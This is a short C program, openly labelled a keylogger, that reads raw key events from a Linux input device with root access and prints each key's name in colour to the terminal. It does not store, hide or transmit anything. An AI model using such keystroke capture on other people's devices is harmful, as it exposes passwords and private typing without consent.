#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>


#define RED     "\x1b[31m"
#define GREEN   "\x1b[32m"
#define YELLOW  "\x1b[33m"
#define BLUE    "\x1b[34m"
#define MAGENTA "\x1b[35m"
#define CYAN    "\x1b[36m"
#define RESET   "\x1b[0m"
#define BOLD    "\x1b[1m"
#define RED     "\x1b[31m"
#define GREEN   "\x1b[32m"
#define YELLOW  "\x1b[33m"
#define BLUE    "\x1b[34m"
#define MAGENTA "\x1b[35m"
#define CYAN    "\x1b[36m"
#define WHITE   "\x1b[37m"
#define RESET   "\x1b[0m"
#define BOLD    "\x1b[1m"
const char *get_key_name(int code, char **color) {
    static const char *key_map[248] = {
    [1] = "ESC", [2] = "1", [3] = "2", [4] = "3", [5] = "4", [6] = "5", [7] = "6", [8] = "7", [9] = "8", [10] = "9", [11] = "0",
    [12] = "-", [13] = "=", [14] = "BACKSPACE", [15] = "TAB",
    [16] = "q", [17] = "w", [18] = "e", [19] = "r", [20] = "t", [21] = "y", [22] = "u", [23] = "i", [24] = "o", [25] = "p", [26] = "[", [27] = "]",
    [28] = "ENTER", [29] = "L_CTRL", [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g", [35] = "h", [36] = "j", [37] = "k", [38] = "l", [39] = ";", [40] = "'", [41] = "`",
    [42] = "L_SHIFT", [43] = "\\", [44] = "z", [45] = "x", [46] = "c", [47] = "v", [48] = "b", [49] = "n", [50] = "m", [51] = ",", [52] = ".", [53] = "/", [54] = "R_SHIFT",
    [55] = "KPASTERISK", [56] = "L_ALT", [57] = "SPACE", [58] = "CAPS_LOCK",
    [59] = "F1", [60] = "F2", [61] = "F3", [62] = "F4", [63] = "F5", [64] = "F6", [65] = "F7", [66] = "F8", [67] = "F9", [68] = "F10",
    [69] = "NUM_LOCK", [70] = "SCROLL_LOCK",
    [71] = "KP7", [72] = "KP8", [73] = "KP9", [74] = "KPMINUS", [75] = "KP4", [76] = "KP5", [77] = "KP6", [78] = "KPPLUS", [79] = "KP1", [80] = "KP2", [81] = "KP3", [82] = "KP0", [83] = "KPDOT",
    [87] = "F11", [88] = "F12",
    [96] = "KPENTER", [97] = "R_CTRL", [98] = "KPSLASH", [99] = "PRTSCR", [100] = "R_ALT", [102] = "HOME",
    [103] = "UP", [104] = "PAGE_UP", [105] = "LEFT", [106] = "RIGHT", [107] = "END", [108] = "DOWN", [109] = "PAGE_DOWN", [110] = "INSERT", [111] = "DELETE",
    [119] = "PAUSE", [125] = "WIN_L", [126] = "WIN_R", [127] = "MENU"
};
    if (code >= 103 && code <= 108) *color = CYAN;
    else if (code == 28 || code == 1 || code == 14) *color = RED; 
    else if (code == 57) *color = MAGENTA;           
    else if (code == 42 || code == 54 || code == 29 || code == 56) *color = YELLOW; 
    else *color = GREEN;                           

    if (code >= 0 && code < 248 && key_map[code] != NULL) {
        return key_map[code];
    }
    *color = RESET;
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf(BOLD "Sử dụng: sudo %s /dev/input/eventX\n" RESET, argv[0]);
        exit(-1);
    }

    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        perror(RED "Lỗi mở file" RESET);
        exit(-1);
    }

    struct input_event ie;
    char *color;
    printf(BOLD YELLOW "--- Keylogger Active ---\n" RESET);

    while (read(fd, &ie, sizeof(ie)) > 0) {
        if (ie.type == EV_KEY && (ie.value == 1 || ie.value == 2)) {
            const char *name = get_key_name(ie.code, &color);
            
            if (name) {
                printf("%s[%s]%s \n", color, name, RESET);
            } else {
                printf(WHITE "[CODE_%-4d] " RESET, ie.code);
            }
            

            if (ie.code == 28) printf("\n");
            
            fflush(stdout); 
        }
    }

    close(fd);
    return 0;
}
